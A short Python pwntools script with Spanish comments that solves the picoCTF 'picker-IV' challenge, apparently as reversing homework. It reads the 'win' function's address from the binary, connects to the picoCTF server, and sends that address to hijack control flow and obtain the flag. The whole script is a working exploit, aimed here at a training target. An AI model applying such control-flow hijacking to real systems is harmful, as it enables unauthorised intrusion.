from pwn import *

# Ruta completa al archivo
binary_path = r'C:\Users\watch\Downloads\NotasHacking\DocumentacionHacking\Tarea_Reversing_2\Ejercicio_7\picker-IV'

try:
    # Cargar ELF con ruta completa
    elf = ELF(binary_path)
    print(f"✅ Binario cargado: {binary_path}")
    print(f"📌 Dirección de 'win': {hex(elf.symbols['win'])}")
    
    # Conectar al servidor
    r = remote('saturn.picoctf.net', 60267)
    print("✅ Conectado al servidor")
    
    # Enviar dirección sin el '0x'
    win_addr = hex(elf.symbols['win'])[2:]
    print(f"📤 Enviando dirección: {win_addr}")
    
    r.sendlineafter(b': ', win_addr.encode())
    
    # Recibir respuesta
    response = r.recvall(timeout=2)
    print("📥 Respuesta recibida:")
    print(response.decode())
    
except FileNotFoundError:
    print(f"❌ Error: No se encuentra el archivo en: {binary_path}")
    print("💡 Verifica que el archivo 'picker-IV' existe en esa ubicación")
except Exception as e:
    print(f"❌ Error durante la ejecución: {e}")